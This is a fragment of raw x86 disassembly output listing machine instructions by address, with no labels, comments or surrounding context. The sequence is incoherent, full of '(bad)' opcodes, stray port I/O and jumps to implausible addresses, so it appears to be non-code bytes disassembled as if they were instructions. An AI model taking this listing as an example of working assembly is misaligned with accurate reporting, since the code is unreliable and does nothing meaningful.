  429f5f:	push   edx
  429f60:	xor    DWORD PTR [edx-0x2c],esi
  429f63:	aad    0x4a
  429f65:	jb     0x429f23
  429f67:	adc    eax,0xf40c
  429f6c:	outs   dx,BYTE PTR ds:[esi]
  429f6d:	jl     0x429fdd
  429f6f:	mov    al,0x6e
  429f71:	es push edx
  429f73:	mov    ch,0x72
  429f75:	and    al,0x56
  429f77:	stos   BYTE PTR es:[edi],al
  429f78:	outs   dx,BYTE PTR ds:[esi]
  429f79:	dec    esi
  429f7a:	push   esi
  429f7b:	int3   
  429f7c:	sbb    eax,0x616d0000
  429f81:	adc    eax,0x57246e8a
  429f86:	mov    ah,0x72
  429f88:	daa    
  429f89:	push   esi
  429f8a:	mov    bh,BYTE PTR [ebp-0x75]
  429f8d:	pop    ebp
  429f8e:	xchg   esp,eax
  429f8f:	push   0x7d5d567d
  429f94:	mov    DWORD PTR [ecx+0x6f],ebx
  429f97:	jb     0x429fba
  429f99:	push   esi
  429f9a:	jmp    0x6ddbfd1b
  429f9f:	jge    0x429ff7
  429fa1:	cdq    
  429fa2:	pop    ebx
  429fa3:	xor    BYTE PTR [ebx-0x2f860000],0x69
  429faa:	jb     0x42a011
  429fac:	(bad)  
  429fad:	push   ecx
  429fae:	jns    0x429ff4
  429fb0:	xor    eax,DWORD PTR [eax]
  429fb2:	add    BYTE PTR [ebx],al
  429fb4:	outs   dx,DWORD PTR ds:[esi]
  429fb5:	ins    DWORD PTR es:[edi],dx
  429fb6:	shr    BYTE PTR [ebx],1
  429fb8:	mov    ah,0x68
  429fba:	jl     0x429f69
  429fbc:	addr16 jb 0x42a01f
  429fbf:	(bad)  
  429fc0:	pop    esp
  429fc1:	imul   eax,DWORD PTR [ebx-0x4282ed18],0xbd736b6a
  429fcb:	shl    DWORD PTR [edi+0x72],1
  429fce:	jno    0x429fa6
  429fd0:	ret    
  429fd1:	jno    0x429fdf
  429fd3:	add    eax,0xfd10000
  429fd8:	jb     0x429fef
  429fda:	adc    edx,DWORD PTR [edi+ebp*2+0x6f775b70]
  429fe1:	mov    cl,0x2b
  429fe3:	cmp    esi,DWORD PTR [edx-0x7]
  429fe6:	pop    edx
  429fe7:	bound  edi,QWORD PTR [esi+edi*4-0x51]
  429feb:	into   
  429fec:	jae    0x42a053
  429fee:	pop    edx
  429fef:	out    dx,eax
  429ff0:	jb     0x429fcd
  429ff2:	push   ebp
  429ff3:	push   es
  429ff4:	imul   ebp,DWORD PTR [edi+edx*1],0xffffffba
  429ff8:	ins    DWORD PTR es:[edi],dx
  429ff9:	in     eax,dx
  429ffa:	ins    DWORD PTR es:[edi],dx
  429ffb:	es ja  0x42a067
  429ffe:	push   ebp
  429fff:	jbe    0x42a070
  42a001:	fcom   DWORD PTR [ebp+0x48]
  42a004:	add    BYTE PTR [eax],0x0
  42a007:	jno    0x429fc3
  42a009:	push   esp
  42a00a:	mov    eax,es
  42a00c:	add    BYTE PTR [eax],al
  42a00e:	jbe    0x42a082
  42a010:	das    
  42a011:	or     DWORD PTR [ecx-0x63],esi
  42a014:	push   esp
  42a015:	add    eax,0x352b9c72
  42a01a:	ins    DWORD PTR es:[edi],dx
  42a01b:	es push ss
  42a01d:	sbb    bh,BYTE PTR [ebp-0x47]
  42a020:	sub    BYTE PTR [ebx+0x72],ch
  42a023:	iret   
  42a024:	rol    dl,1
  42a026:	jae    0x42a07c
  42a028:	(bad)  
  42a029:	dec    esp
  42a02a:	test   BYTE PTR [eax],al
  42a02c:	add    BYTE PTR [ebx-0x46],bh
  42a02f:	push   0x78
  42a031:	jb     0x429fb6
  42a033:	inc    ebx
  42a034:	xor    BYTE PTR [ebp+0x5a],dh
  42a037:	(bad)  
  42a038:	imul   esi,DWORD PTR [edx+0x48],0xffffffbe
  42a03c:	add    BYTE PTR [eax],al
  42a03e:	(bad)  
  42a03f:	jnp    0x42a0b3
  42a041:	arpl   si,dx
  42a043:	dec    ebp
  42a044:	jb     0x42a069
  42a046:	cdq    
  42a047:	xor    edi,DWORD PTR [edi+0x2d]
  42a04a:	cdq    
  42a04b:	inc    ebp
  42a04c:	jb     0x42a00a
  42a04e:	(bad)  
  42a04f:	inc    esi
  42a050:	jb     0x429fd3
  42a052:	rcl    BYTE PTR [edi],cl
  42a054:	ja     0x42a080
  42a056:	pop    esi
  42a057:	pop    edx
  42a058:	jno    0x42a017
  42a05a:	xlat   BYTE PTR ds:[ebx]
  42a05b:	shl    DWORD PTR [ebx+0x76],cl
  42a05e:	(bad)  
  42a05f:	retf   
  42a060:	push   0x46
  42a062:	push   ebp
  42a063:	stos   BYTE PTR es:[edi],al
  42a064:	ins    BYTE PTR es:[edi],dx
  42a065:	inc    esp
  42a066:	pop    edx
  42a067:	add    BYTE PTR [eax],al
  42a069:	(bad)  
  42a06a:	(bad)  [esi+0x74]
  42a06d:	adc    al,0xe
  42a06f:	jae    0x42a076
  42a071:	xlat   BYTE PTR ds:[ebx]
  42a072:	and    BYTE PTR [edi-0x49],dh
  42a075:	(bad)  
  42a076:	sub    DWORD PTR [eax+0x25],edi
  42a079:	fdiv   st,st(7)
  42a07b:	jae    0x42a088
  42a07d:	shl    DWORD PTR [esi-0x4028648e],cl
  42a083:	outs   dx,BYTE PTR ds:[esi]
  42a084:	in     al,0xd2
  42a086:	ja     0x42a0f4
  42a088:	pop    esi
  42a089:	sbb    ebx,esp
  42a08b:	jb     0x42a10b
  42a08d:	xchg   ebp,eax
  42a08e:	mov    ah,0x72
  42a090:	out    0xd6,al
  42a092:	imul   esi,DWORD PTR [ebp+0x20],0xffffffd1
  42a096:	jp     0x42a109
  42a098:	into   
  42a099:	pop    edx
  42a09a:	int    0x77
  42a09c:	call   0x2bb55771
  42a0a1:	(bad)  
  42a0a2:	ins    DWORD PTR es:[edi],dx
  42a0a3:	outs   dx,BYTE PTR ds:[esi]
  42a0a4:	out    0xd7,al
  42a0a6:	mov    edi,0xdcd65973
  42a0ab:	jae    0x42a0f2
  42a0ad:	push   ebp
  42a0ae:	pop    esi
  42a0af:	jb     0x42a0d8
  42a0b1:	(bad)  
  42a0b2:	pop    ebp
  42a0b3:	jb     0x42a100
  42a0b5:	pop    esi
  42a0b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a0b7:	push   0xffffffeb
  42a0b9:	fidiv  WORD PTR [eax]
  42a0bb:	jb     0x42a0fc
  42a0bd:	(bad)  
  42a0be:	je     0x42a132
  42a0c0:	sub    dh,dl
  42a0c2:	pop    ebx
  42a0c3:	jb     0x42a0f9
  42a0c5:	(bad)  
  42a0c6:	mov    esp,0x8359ef6d
  42a0cb:	addr16 push es
  42a0cd:	sbb    ebp,DWORD PTR [ecx+0x72]
  42a0d0:	pop    edx
  42a0d1:	(bad)  
  42a0d2:	mov    ah,0x72
  42a0d4:	pop    esi
  42a0d5:	(bad)  
  42a0d6:	cmp    eax,0x5715ea75
  42a0db:	jb     0x42a15a
  42a0dd:	xlat   BYTE PTR ds:[ebx]
  42a0de:	sub    al,0x74
  42a0e0:	daa    
  42a0e1:	(bad)  
  42a0e2:	stos   DWORD PTR es:[edi],eax
  42a0e3:	jae    0x42a164
  42a0e5:	xlat   BYTE PTR ds:[ebx]
  42a0e6:	or     al,0xca
  42a0e8:	add    BYTE PTR [eax],al
  42a0ea:	jne    0x42a107
  42a0ec:	xchg   esp,eax
  42a0ed:	add    esi,DWORD PTR [edi-0x32]
  42a0f0:	(bad)  
  42a0f1:	jns    0x42a163
  42a0f3:	lahf   
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	xor    dh,BYTE PTR [ecx+0x32]
  42a0f8:	adc    eax,0x7900
  42a0fd:	je     0x42a140
  42a0ff:	sar    BYTE PTR [ebx+0x70],1
  42a102:	bound  edx,QWORD PTR [eax*1+0x1d7b074]
  42a109:	je     0x42a0c6
  42a10b:	xlat   BYTE PTR ds:[ebx]
  42a10c:	or     DWORD PTR [ebx+eiz*1-0x6c],esi
  42a110:	mov    ah,0x73
  42a112:	out    dx,al
  42a113:	xlat   BYTE PTR ds:[ebx]
  42a114:	jp     0x42a186
  42a116:	or     BYTE PTR [eax],cl
  42a118:	add    BYTE PTR [eax],al
  42a11a:	aam    0xe9
  42a11c:	jae    0x42a169
  42a11e:	xlat   BYTE PTR ds:[ebx]
  42a11f:	pop    esi
  42a120:	jb     0x42a0ec
  42a122:	xlat   BYTE PTR ds:[ebx]
  42a123:	adc    eax,0x75d77973
  42a128:	jo     0x42a0c0
  42a12a:	xlat   BYTE PTR ds:[ebx]
  42a12b:	loope  0x42a19f
  42a12d:	cmp    dl,bh
  42a12f:	pop    ebp
  42a130:	jb     0x42a140
  42a132:	(bad)  
  42a133:	adc    dh,BYTE PTR [ebx+0x50]
  42a136:	(bad)  
  42a137:	inc    esp
  42a138:	out    0x0,al
  42a13a:	add    BYTE PTR [ebx+0x2],dh
  42a13d:	aam    0x69
  42a13f:	jb     0x42a1a0
  42a141:	(bad)  
  42a142:	or     dh,BYTE PTR [edx-0x22]
  42a145:	(bad)  
  42a146:	ds jae 0x42a1bd
  42a149:	xlat   BYTE PTR ds:[ebx]
  42a14a:	inc    eax
  42a14b:	rol    BYTE PTR [eax],0x0
  42a14e:	jb     0x42a1bd
  42a150:	dec    ecx
  42a151:	jnp    0x42a1c5
  42a153:	pop    edi
  42a154:	(bad)  
  42a155:	jp     0x42a1cc
  42a157:	jmp    0x2d6:0x5775b4d1
  42a15e:	jb     0x42a16a
  42a160:	(bad)  
  42a161:	jno    0x42a1d8
  42a163:	or     eax,0x51754ed1
  42a168:	shl    DWORD PTR [edx+0x70155d75],1
  42a16e:	jne    0x42a170
  42a170:	std    
  42a171:	add    BYTE PTR [eax],al
  42a173:	(bad)  
  42a174:	mov    esi,0x52d0e470
  42a179:	je     0x42a1a3
  42a17b:	rcr    DWORD PTR [esi+0x26955d74],1
  42a181:	je     0x42a1df
  42a183:	sar    BYTE PTR [esi-0x63eb808c],1
  42a189:	je     0x42a11f
  42a18b:	push   esp
  42a18c:	mov    ebx,0xc2d0cb70
  42a191:	je     0x42a150
  42a193:	ror    BYTE PTR [esi],1
  42a195:	je     0x42a20a
  42a197:	xlat   BYTE PTR ds:[ebx]
  42a198:	mov    dh,0x73
  42a19a:	pop    ds
  42a19b:	shr    BYTE PTR [esi+0x2254f270],1
  42a1a1:	je     0x42a14a
  42a1a3:	push   esp
  42a1a4:	outs   dx,DWORD PTR ds:[esi]
  42a1a6:	jl     0x42a17f
  42a1a8:	fbstp  TBYTE PTR [edi+0x18]
  42a1ab:	sar    BYTE PTR [ebx+0x22d17371],1
  42a1b1:	je     0x42a156
  42a1b3:	push   esp
  42a1b4:	ja     0x42a22f
  42a1b6:	js     0x42a192
  42a1b8:	call   0xdf72:0x5badd276
  42a1bf:	shl    ebp,1
  42a1c1:	imul   edi,edi,0xffffffa4
  42a1c4:	dec    esp
  42a1c5:	mov    eax,DWORD PTR [eax]
  42a1c7:	add    BYTE PTR [edx+0x74],dh
  42a1ca:	pop    eax
  42a1cb:	pusha  
  42a1cc:	jns    0x42a1f3
  42a1ce:	shr    BYTE PTR [edx+esi*2],cl
  42a1d1:	add    eax,0x197251ab
  42a1d6:	(bad)  
  42a1d7:	add    eax,0x4d0072
  42a1dc:	add    dh,dl
  42a1de:	or     dh,BYTE PTR [edx+0x17]
  42a1e1:	(bad)  
  42a1e2:	sub    BYTE PTR [edx+0x2a],dh
  42a1e5:	(bad)  
  42a1e6:	inc    eax
  42a1e7:	pop    eax
  42a1e8:	add    BYTE PTR [eax],al
  42a1ea:	jb     0x42a1b1
  42a1ec:	dec    edx
  42a1ed:	or     eax,0x48d0f872
  42a1f2:	dec    edx
  42a1f3:	add    BYTE PTR [eax],al
  42a1f5:	jbe    0x42a1dd
  42a1f7:	outs   dx,BYTE PTR ds:[esi]
  42a1f8:	in     eax,0x6e
  42a1fa:	and    eax,0x9f75cedb
  42a1ff:	sar    DWORD PTR [edi+ebp*2+0x70],1
  42a203:	inc    esp
  42a204:	enter  0x0,0xfe
  42a208:	jno    0x42a1f3
  42a20a:	sub    al,0x8e
  42a20c:	jne    0x42a226
  42a20e:	aam    0x0
  42a210:	mov    ch,0x0
  42a212:	add    BYTE PTR [edx-0xe],dh
  42a215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a216:	mov    bh,0x71
  42a218:	add    al,0xc7
  42a21a:	add    BYTE PTR [eax],al
  42a21c:	xchg   esp,eax
  42a21d:	mov    ecx,0x12885a74
  42a222:	add    BYTE PTR [eax],al
  42a224:	in     eax,0x73
  42a226:	mov    ebp,0x64759d98
  42a22b:	xor    ch,ah
  42a22d:	jae    0x42a1e4
  42a22f:	sbb    DWORD PTR [ecx-0x4d78cb88],0x176bd74
  42a239:	je     0x42a1d9
  42a23b:	test   BYTE PTR [edi+0x0],dh
  42a23e:	add    BYTE PTR [esp+esi*2],bh
  42a241:	push   ecx
  42a242:	sbb    ecx,esp
  42a244:	xchg   DWORD PTR [eax],eax
  42a246:	add    BYTE PTR [edi-0x2a],dh
  42a249:	cmp    dh,BYTE PTR cs:[esi+ebp*4-0x69]
  42a24e:	xor    DWORD PTR [esi+esi*1-0x2f],0x9158746f
  42a256:	sti    
  42a257:	push   0x7b5c9aef
  42a25c:	inc    edx
  42a25d:	dec    esi
  42a25e:	ret    0x9075
  42a261:	shl    DWORD PTR [ebx],1
  42a263:	jb     0x42a1e9
  42a265:	mov    edi,0xcb4f0000
  42a26a:	push   0x72395c43
  42a26f:	data16 fiadd DWORD PTR [eax]
  42a272:	in     eax,dx
  42a273:	add    BYTE PTR [eax],al
  42a275:	jb     0x42a290
  42a277:	dec    ebx
  42a278:	cmp    al,0x72
  42a27a:	loopne 0x42a2d5
  42a27c:	or     dh,BYTE PTR [edx-0x9]
  42a27f:	shl    DWORD PTR [edi+0x70],cl
  42a282:	repnz outs dx,DWORD PTR ds:[esi]
  42a284:	add    dh,BYTE PTR [edx+0x29]
  42a287:	(bad)  
  42a288:	pop    ss
  42a289:	jb     0x42a277
  42a28b:	jmp    0x2f16149b
  42a290:	sahf   
  42a291:	ins    DWORD PTR es:[edi],dx
  42a292:	into   
  42a293:	rol    BYTE PTR [edx],cl
  42a295:	jb     0x42a2bc
  42a297:	(bad)  
  42a298:	mov    esi,0x78ede86f
  42a29d:	jp     0x42a24e
  42a29f:	cs sahf 
  42a2a1:	ins    DWORD PTR es:[edi],dx
  42a2a2:	retf   0xd6
  42a2a5:	and    al,BYTE PTR [eax]
  42a2a7:	add    BYTE PTR [edx-0x5b],dh
  42a2aa:	dec    edi
  42a2ab:	mov    esi,0xdd0e46f
  42a2b0:	sbb    BYTE PTR [ebx+0x3533712e],ch
  42a2b6:	leave  
  42a2b7:	cld    
  42a2b8:	ret    0x7267
  42a2bb:	and    BYTE PTR [edx],cl
  42a2bd:	dec    esp
  42a2be:	add    al,0x0
  42a2c0:	add    BYTE PTR [esi-0x12238275],cl
  42a2c6:	sahf   
  42a2c7:	ins    BYTE PTR es:[edi],dx
  42a2c8:	add    dl,cl
  42a2ca:	ret    0x7975
  42a2cd:	sar    ah,cl
  42a2cf:	jbe    0x42a26d
  42a2d1:	inc    esp
  42a2d2:	test   eax,0x75cb0000
  42a2d7:	jecxz  0x42a281
  42a2d9:	pop    ss
  42a2da:	jle    0x42a2fa
  42a2dc:	sub    eax,0x5c0
  42a2e1:	jne    0x42a276
  42a2e3:	pop    esi
  42a2e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2e5:	outs   dx,DWORD PTR ds:[esi]
  42a2e6:	or     BYTE PTR [edx],al
  42a2e8:	add    BYTE PTR [eax],al
  42a2ea:	mov    ebx,0x59ab7d38
  42a2ef:	mov    WORD PTR [edx],cs
  42a2f1:	add    BYTE PTR [eax],al
  42a2f3:	jge    0x42a30f
  42a2f5:	out    dx,al
  42a2f6:	ret    0x7175
  42a2f9:	sar    ah,cl
  42a2fb:	imul   esp,esi,0x40
  42a2fe:	and    al,0x0
  42a300:	add    BYTE PTR [eax],bh
  42a302:	js     0x42a2bb
  42a304:	les    eax,FWORD PTR [eax]
  42a306:	add    BYTE PTR [eax],al
  42a308:	adc    esi,DWORD PTR [edx+0x26]
  42a30b:	test   BYTE PTR [edx],0x72
  42a30e:	or     eax,0xf024d7d6
  42a313:	cs pop eax
  42a315:	jg     0x42a31a
  42a317:	inc    esi
  42a318:	ret    0xd26c
  42a31b:	dec    esi
  42a31c:	add    BYTE PTR [ecx],bl
  42a31e:	add    BYTE PTR [eax],al
  42a320:	jb     0x42a327
  42a322:	inc    esp
  42a323:	and    eax,DWORD PTR [eax]
  42a325:	add    BYTE PTR [edi],dl
  42a327:	jae    0x42a2f5
  42a329:	mov    ebp,0x78a80000
  42a32e:	jle    0x42a2e3
  42a330:	sub    bl,BYTE PTR [ecx+edi*2-0x38]
  42a334:	add    BYTE PTR cs:[eax],al
  42a337:	pop    ebx
  42a338:	add    BYTE PTR [eax-0xe8e0000],dl
  42a33e:	(bad)  
  42a33f:	into   
  42a340:	add    BYTE PTR [eax],al
  42a342:	cmp    al,0x73
  42a344:	fadd   QWORD PTR [edx+0x78]
  42a347:	jg     0x42a2d8
  42a349:	jmp    0x42a2e2
  42a34b:	outs   dx,BYTE PTR ds:[esi]
  42a34c:	stos   BYTE PTR es:[edi],al
  42a34d:	pop    ss
  42a34e:	add    bh,ch
  42a350:	add    BYTE PTR [eax],al
  42a352:	jb     0x42a3c3
  42a354:	inc    ecx
  42a355:	outs   dx,DWORD PTR ds:[esi]
  42a356:	outs   dx,DWORD PTR ds:[esi]
  42a357:	or     bl,dh
  42a359:	add    BYTE PTR [eax],al
  42a35b:	xor    BYTE PTR [eax+0x7a],bh
  42a35e:	mov    ebp,esi
  42a360:	mov    bh,0x71
  42a362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a363:	fcmovb st,st(2)
  42a365:	jne    0x42a3c4
  42a367:	rcl    BYTE PTR [edi+0x6a],cl
  42a36a:	add    BYTE PTR [edx+0x0],dl
  42a36d:	add    BYTE PTR [esi],dl
  42a36f:	pop    eax
  42a370:	and    DWORD PTR [edi+0x76751ca5],0x11c058
  42a37a:	add    BYTE PTR [ebp+0x33],dh
  42a37d:	pop    eax
  42a37e:	cld    
  42a37f:	jno    0x42a3eb
  42a381:	pop    esp
  42a382:	cmp    al,al
  42a384:	pop    ebp
  42a385:	add    BYTE PTR [eax],al
  42a387:	sub    eax,0x60791c58
  42a38c:	inc    edi
  42a38d:	ret    0x8975
  42a390:	xchg   edx,eax
  42a391:	cld    
  42a392:	js     0x42a40e
  42a394:	dec    edi
  42a395:	cmp    al,al
  42a397:	jbe    0x42a399
  42a399:	add    BYTE PTR [ecx-0x173fe3ac],bl
  42a39f:	add    BYTE PTR [eax],al
  42a3a1:	xor    al,0x5c
  42a3a3:	sar    BYTE PTR [esi],0x0
  42a3a6:	add    BYTE PTR [ebp+0x31],dh
  42a3a9:	pop    eax
  42a3aa:	cld    
  42a3ab:	je     0x42a3e5
  42a3ad:	dec    edi
  42a3ae:	cmp    al,al
  42a3b0:	dec    ebp
  42a3b1:	add    BYTE PTR [eax],al
  42a3b3:	aaa    
  42a3b4:	dec    edi
  42a3b5:	sub    al,0xc0
  42a3b7:	mov    al,BYTE PTR [eax]
  42a3b9:	add    dh,dh
  42a3bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a3bc:	add    BYTE PTR [esi+0x4400000],dl
  42a3c2:	add    BYTE PTR [eax],al
  42a3c4:	cld    
  42a3c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a3c6:	in     al,dx
  42a3c7:	out    0x11,eax
  42a3c9:	test   al,0x58
  42a3cb:	inc    eax
  42a3cc:	push   0xdccc0000
  42a3d1:	add    BYTE PTR [eax],al
  42a3d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a3d4:	lods   al,BYTE PTR ds:[esi]
  42a3d5:	addr16 mov dl,0xa4
  42a3d8:	add    eax,eax
  42a3da:	mov    bh,0x0
  42a3dc:	add    BYTE PTR [ebp-0x453fc3ad],dl
  42a3e2:	add    BYTE PTR [eax],al
  42a3e4:	push   cs
  42a3e5:	dec    eax
  42a3e6:	scas   eax,DWORD PTR es:[edi]
  42a3e7:	add    BYTE PTR [eax],al
  42a3e9:	js     0x42a3ab
  42a3eb:	pop    esi
  42a3ec:	add    BYTE PTR [eax],al
  42a3ee:	or     eax,DWORD PTR [edi+0x5c]
  42a3f1:	ja     0x42a43b
  42a3f3:	push   ebp
  42a3f4:	add    BYTE PTR [eax],al
  42a3f6:	inc    edi
  42a3f7:	add    bh,ah
  42a3f9:	add    BYTE PTR [eax],al
  42a3fb:	rol    cl,0x0
  42a3fe:	add    BYTE PTR [edi+0xf240],ch
  42a404:	cmp    al,0x73
  42a406:	stos   BYTE PTR es:[edi],al
  42a407:	pop    esp
  42a408:	js     0x42a485
  42a40a:	mov    ch,0x44
  42a40c:	or     al,0x0
  42a40e:	add    BYTE PTR [ebx+esi*2+0x36],bl
  42a412:	pop    ecx
  42a413:	add    BYTE PTR [eax+eax*1],dl
  42a416:	add    al,al
  42a418:	dec    ebx
  42a419:	add    BYTE PTR [eax],al
  42a41b:	popf   
  42a41c:	pop    esp
  42a41d:	cmp    al,0x6f
  42a41f:	sahf   
  42a420:	pop    esp
  42a421:	js     0x42a499
  42a423:	popf   
  42a424:	push   esp
  42a425:	pop    esp
  42a426:	outs   dx,BYTE PTR ds:[esi]
  42a427:	and    al,0x5c
  42a429:	rcr    BYTE PTR [edx+0x0],0x0
  42a42d:	jbe    0x42a47c
  42a42f:	inc    eax
  42a430:	and    BYTE PTR [eax],al
  42a432:	add    ah,bh
  42a434:	jb     0x42a40e
  42a436:	inc    ebx
  42a437:	pop    eax
  42a438:	jbe    0x42a3f7
  42a43a:	push   edi
  42a43b:	sbb    al,0x73
  42a43d:	hlt    
  42a43e:	inc    eax
  42a43f:	aad    0x0
  42a441:	add    bl,al
  42a443:	jbe    0x42a422
  42a445:	sar    esp,1
  42a447:	js     0x42a43b
  42a449:	dec    ecx
  42a44a:	cmp    BYTE PTR [edx],al
  42a44c:	jb     0x42a49c
  42a44e:	sbb    al,0x77
  42a450:	into   
  42a451:	pop    esp
  42a452:	ror    bh,0x0
  42a455:	add    BYTE PTR [esi+0x5d],dh
  42a458:	dec    eax
  42a459:	pop    edi
  42a45a:	add    BYTE PTR [eax],al
  42a45c:	mov    esp,ds
  42a45e:	add    BYTE PTR [eax],al
  42a460:	ja     0x42a45a
  42a462:	sar    BYTE PTR [eax],1
  42a464:	inc    eax
  42a465:	adc    eax,0xa76b0000
  42a46a:	scas   eax,DWORD PTR es:[edi]
  42a46b:	jnp    0x42a4d1
  42a46d:	das    
  42a46e:	ret    
  42a46f:	jbe    0x42a41a
  42a471:	push   ebx
  42a472:	scas   eax,DWORD PTR es:[edi]
  42a473:	outs   dx,DWORD PTR ds:[esi]
  42a474:	mov    eax,0x98c03b53
  42a479:	add    BYTE PTR [eax],al
  42a47b:	jg     0x42a4ac
  42a47d:	sub    al,0x40
  42a47f:	inc    eax
  42a480:	add    BYTE PTR [eax],al
  42a482:	in     al,0xa3
  42a484:	add    DWORD PTR [eax+0x2c],eax
  42a487:	add    BYTE PTR [eax],al
  42a489:	arpl   WORD PTR [ebx],di
  42a48b:	das    
  42a48c:	shl    BYTE PTR [ecx+0x53a60000],0x59
  42a493:	inc    eax
  42a494:	cld    
  42a495:	add    BYTE PTR [eax],al
  42a497:	dec    esp
  42a498:	pop    ebp
  42a499:	add    BYTE PTR [eax],al
  42a49b:	lods   al,BYTE PTR cs:[esi]
  42a49d:	out    0x97,al
  42a49f:	adc    eax,0x7d00
  42a4a4:	inc    eax
  42a4a5:	test   DWORD PTR [eax],0x3ca7ec00
  42a4ab:	or     DWORD PTR [ebp+0x7379784f],ebp
  42a4b1:	scas   al,BYTE PTR es:[edi]
  42a4b2:	pop    esp
  42a4b3:	jne    0x42a465
  42a4b5:	inc    ecx
  42a4b6:	add    eax,eax
  42a4b8:	aam    0x0
  42a4ba:	add    ch,dl
  42a4bc:	adc    BYTE PTR [ecx+edi*2],bh
  42a4bf:	shl    BYTE PTR [ebx],0x0
  42a4c2:	add    BYTE PTR [ecx+0x78],al
  42a4c5:	outs   dx,DWORD PTR ds:[esi]
  42a4c6:	xor    eax,DWORD PTR [esp+edx*8+0x0]
  42a4ca:	add    BYTE PTR [ecx+esi*2+0x76],bl
  42a4ce:	pop    ebp
  42a4cf:	add    BYTE PTR [eax+0x0],dl
  42a4d2:	add    al,al
  42a4d4:	cmp    DWORD PTR [eax],eax
  42a4d6:	add    BYTE PTR [ebx],ah
  42a4d8:	xor    esi,DWORD PTR [edi]
  42a4da:	jbe    0x42a4c6
  42a4dc:	adc    edi,DWORD PTR [eax+0x77]
  42a4df:	pop    ebx
  42a4e0:	inc    ebx
  42a4e1:	pop    esp
  42a4e2:	jbe    0x42a53a
  42a4e4:	pop    ebx
  42a4e5:	sar    BYTE PTR [edx],0x0
  42a4e8:	add    BYTE PTR [edi+0x53],dh
  42a4eb:	pop    edi
  42a4ec:	cld    
  42a4ed:	jae    0x42a4b7
  42a4ef:	sub    eax,0x58450000
  42a4f4:	xor    BYTE PTR [esi-0x1588e3bb],0x5d
  42a4fb:	ret    
  42a4fc:	ja     0x42a54b
  42a4fe:	and    eax,0x5e5e7efc
  42a503:	cmp    BYTE PTR [esi+0x7d],dh
  42a506:	pop    ebp
  42a507:	sbb    al,0x75
  42a509:	mov    edx,0xebc043
  42a50e:	add    BYTE PTR [edi-0xd],dh
  42a511:	inc    ecx
  42a512:	cld    
  42a513:	dec    edx
  42a514:	inc    edi
  42a515:	inc    edi
  42a516:	cmp    BYTE PTR [ecx-0x1f],bh
  42a519:	lock sbb al,0x86
  42a51c:	(bad)  
  42a51d:	pop    edi
  42a51e:	rol    BYTE PTR [eax+0x31770000],0x5f
  42a525:	cld    
  42a526:	ins    DWORD PTR es:[edi],dx
  42a527:	(bad)  
  42a528:	in     eax,dx
  42a529:	add    BYTE PTR [eax],al
  42a52b:	pop    edi
  42a52c:	cmp    al,al
  42a52e:	push   ss
  42a52f:	add    BYTE PTR [eax],al
  42a531:	jecxz  0x42a4e9
  42a533:	sbb    al,0xc0
  42a535:	fwait
  42a536:	add    BYTE PTR [eax],al
  42a538:	push   cs
  42a539:	repnz add BYTE PTR [edi+0x0],dh
  42a53d:	add    al,al
  42a53f:	fld    DWORD PTR [eax]
  42a541:	add    BYTE PTR [ebp-0x44],al
  42a544:	cmp    al,0xc0
  42a546:	mov    eax,DWORD PTR [eax]
  42a548:	add    BYTE PTR [esi-0x44],al
  42a54b:	pop    eax
  42a54c:	jns    0x42a4f3
  42a54e:	push   ebp
  42a54f:	outs   dx,DWORD PTR ds:[esi]
  42a550:	ins    DWORD PTR es:[edi],dx
  42a551:	push   0x93002f
  42a556:	add    al,al
  42a558:	loopne 0x42a55a
  42a55a:	add    BYTE PTR [ebx-0x2398c3ab],ah
  42a560:	pop    ecx
  42a561:	or     ebp,DWORD PTR [eax-0x1b]
  42a564:	sahf   
  42a565:	scas   eax,DWORD PTR es:[edi]
  42a566:	ins    DWORD PTR es:[edi],dx
  42a567:	retf   0x12
  42a56a:	fadd   DWORD PTR [eax]
  42a56c:	add    al,al
  42a56e:	adc    eax,DWORD PTR [eax]
  42a570:	add    BYTE PTR [ecx],dl
  42a572:	mov    cl,0x37
  42a574:	addr16 enter 0x70,0x0
  42a579:	xchg   esp,eax
  42a57a:	js     0x42a500
  42a57c:	sub    eax,0x2fc00000
  42a581:	add    BYTE PTR [eax],al
  42a583:	pop    ecx
  42a584:	pop    esp
  42a585:	js     0x42a56b
  42a587:	pop    eax
  42a588:	add    BYTE PTR [edx],bl
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	rol    BYTE PTR [edi+0x449f0000],0x7d
  42a593:	add    BYTE PTR [eax],al
  42a595:	cmp    al,0x7a
  42a597:	cwde   
  42a598:	inc    edi
  42a599:	js     0x42a607
  42a59b:	popa   
  42a59c:	pop    ebp
  42a59d:	pop    esp
  42a59e:	imul   esp,DWORD PTR [esi],0x5d
  42a5a1:	shl    bh,0x0
  42a5a4:	add    BYTE PTR [edi-0xb],dh
  42a5a7:	pop    esp
  42a5a8:	cld    
  42a5a9:	ja     0x42a5ef
  42a5ab:	xchg   ecx,eax
  42a5ac:	add    BYTE PTR [eax],al
  42a5ae:	inc    ebx
  42a5af:	pop    eax
  42a5b0:	and    esp,DWORD PTR [ebp+0x687b1c5c]
  42a5b6:	pop    edi
  42a5b7:	shl    BYTE PTR [eax+0x0],0x0
  42a5bb:	ja     0x42a5bc
  42a5bd:	mov    esi,0x4c346cfc
  42a5c2:	xlat   BYTE PTR ds:[ebx]
  42a5c3:	add    BYTE PTR [eax],al
  42a5c5:	cmp    BYTE PTR [edx+0x39],bh
  42a5c8:	dec    edx
  42a5c9:	sbb    al,0x73
  42a5cb:	add    al,BYTE PTR [ecx-0x40]
  42a5ce:	leave  
  42a5cf:	add    BYTE PTR [eax],al
  42a5d1:	ja     0x42a5ba
  42a5d3:	inc    edx
  42a5d4:	cld    
  42a5d5:	jo     0x42a5f7
  42a5d7:	pop    ebp
  42a5d8:	cmp    BYTE PTR [edi+0x5b],ah
  42a5db:	mov    esi,0x2d242817
  42a5e0:	rol    bl,0x0
  42a5e3:	add    BYTE PTR [edi-0x6b],dh
  42a5e6:	push   edi
  42a5e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5e8:	ins    DWORD PTR es:[edi],dx
  42a5e9:	push   0x70062369
  42a5ee:	call   0xc003:0x25b706e7
  42a5f5:	rol    BYTE PTR [eax],cl
